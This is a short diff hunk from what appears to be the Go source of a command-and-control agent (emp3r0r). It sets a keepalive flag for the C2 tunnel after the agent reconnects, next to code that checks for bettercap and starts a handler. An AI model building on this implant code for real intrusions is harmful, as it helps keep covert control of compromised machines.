@@ -335,6 +335,7 @@ connect:
 		util.TakeASnap()
 		goto connect
 	}
+	emp3r0r_data.KCPKeep = true
 	log.Println("Connected to CC TunAPI")
 	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath + "/bettercap") {
 		go agent.VaccineHandler()
